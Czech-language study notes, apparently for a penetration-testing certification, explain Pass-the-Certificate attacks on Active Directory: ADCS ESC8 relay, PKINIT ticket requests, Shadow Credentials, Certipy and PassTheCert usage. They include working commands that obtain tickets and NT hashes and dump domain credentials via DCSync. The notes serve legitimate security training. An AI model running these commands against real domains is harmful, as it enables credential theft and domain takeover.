# 🎫 Pass The Certificate (PtC)

## 1. Co je Pass-the-Certificate?

Pass-the-Certificate je technika, kde místo:

- hesla
- NTLM hashe
- Kerberos klíče

použiješ **X.509 certifikát + privátní klíč** k získání identity uživatele nebo počítače.

Nejčastěji se používá proti:

- Active Directory Certificate Services (ADCS)
- Kerberos PKINIT
- LDAPS autentizaci

Certifikát může reprezentovat:

- uživatele (`john@domain.local`)
- počítač (`DC01$@domain.local`)
- privilegovaný účet

---

# 2. ADCS (Active Directory Certificate Services)

ADCS je Microsoft služba pro vydávání certifikátů.

Používá se například pro:

- smart cards
- VPN
- Wi-Fi autentizaci
- podpisy

Problém:

Špatně nastavené šablony certifikátů mohou umožnit získání certifikátu pro jiného uživatele.

---

# 3. ESC8 - NTLM Relay na ADCS

## Princip

ESC8 využívá:

- ADCS Web Enrollment
- NTLM autentizaci
- chybějící ochrany (EPA)

Útočník:

1. Spustí relay server.
2. Donutí privilegovaný účet autentizovat se.
3. Přesměruje NTLM autentizaci na ADCS.
4. ADCS vystaví certifikát oběti.

Výsledek:

```
DC01$ → certifikát → útočník
```

Například získáš:

```
DC01$.pfx
```

který reprezentuje Domain Controller.

---

# 4. Pass-the-Certificate přes PKINIT

## Princip

Kerberos normálně:

```
uživatel + heslo
        |
        v
       TGT
```

PKINIT:

```
certifikát + privátní klíč
        |
        v
       TGT
```

Certifikát ti umožní získat Kerberos ticket.

---

## Workflow

### 1. Získání certifikátu

Například:

```
administrator.pfx
```

Obsahuje:

```
certificate
+
private key
```

---

### 2. Získání TGT

Nástroj:

```
gettgtpkinit.py
```

Příklad:

```
python3 gettgtpkinit.py \
-cert-pfx administrator.pfx \
-dc-ip <DC_IP> \
DOMAIN/administrator \
administrator.ccache
```

Výsledek:

```
administrator.ccache
```

---

### 3. Nastavení ticketu

```
export KRB5CCNAME=administrator.ccache
```

Kontrola:

```
klist
```

Výstup:

```
administrator@DOMAIN.LOCAL
```

---

### 4. Využití ticketu

Například DCSync:

```
impacket-secretsdump \
-k \
-no-pass \
administrator@dc01.domain.local
```

---

# 5. Shadow Credentials

## Princip

Zneužívá atribut:

```
msDS-KeyCredentialLink
```

Tento atribut normálně používá:

- Windows Hello
- FIDO klíče
- smart cards

Pokud máš právo:

```
WriteProperty
AddKeyCredentialLink
```

můžeš přidat vlastní klíč.

---

## Útok

Oběť:

```
Administrator
```

Ty přidáš:

```
tvůj veřejný klíč
```

AD:

```
Administrator má nový přihlašovací certifikát
```

Potom:

```
certifikát → PKINIT → TGT
```

Výhoda:

Neměníš heslo.

---

# 6. Nástroje

## Certipy (nejčastější v ADCS)

Enumerace ADCS:

```
certipy find -u user -p password -dc-ip <IP>
```

Hledání zranitelných šablon:

```
ESC1
ESC2
ESC3
ESC8
```

---

Získání certifikátu:

```
certipy req \
-u user \
-p password \
-ca CA_NAME \
-template TEMPLATE_NAME
```

---

Autentizace certifikátem:

```
certipy auth \
-pfx administrator.pfx \
-dc-ip <DC_IP>
```

Výstup:

```
NT hash
TGT
```

---

# 7. PassTheCert (LDAPS)

Používá certifikát přímo proti:

```
LDAPS (636)
```

Používá se když:

- PKINIT nefunguje
- KDC nepodporuje certifikáty

Možnosti:

- změna hesla
- úprava LDAP atributů
- přidání práv

---

# 8. Troubleshooting

## PKINIT fail

Možné důvody:

### Špatný EKU

Certifikát musí mít:

```
Client Authentication
```

nebo:

```
Smart Card Logon
```

---

### DNS problém

Kerberos potřebuje hostname:

Špatně:

```
10.129.x.x
```

Správně:

```
dc01.domain.local
```

---

### Časový rozdíl

Kerberos odmítne ticket:

```
ntpdate <DC_IP>
```

---

### Chybí SAN

Certifikát musí obsahovat:

```
User Principal Name (UPN)
```

například:

```
administrator@domain.local
```

---

# 🚀 Rychlý PtC Flow

```
ADCS Enumeration
        |
        v
Najdu zranitelnou šablonu
        |
        v
Získám .pfx certifikát
        |
        v
PKINIT
        |
        v
TGT (.ccache)
        |
        v
Kerberos útoky
        |
        v
DCSync / Lateral Movement
```

---

# CPTS důležité zapamatovat

|Technika|Potřebuješ|Výsledek|
|---|---|---|
|Pass-the-Hash|NTLM hash|SMB/WinRM přístup|
|Pass-the-Ticket|Kerberos ticket|Identita uživatele|
|Pass-the-Certificate|Certifikát + key|TGT / LDAP přístup|
|Shadow Credentials|Write msDS-KeyCredentialLink|Vytvoření vlastní identity|
|ESC8|NTLM relay + ADCS|Certifikát oběti|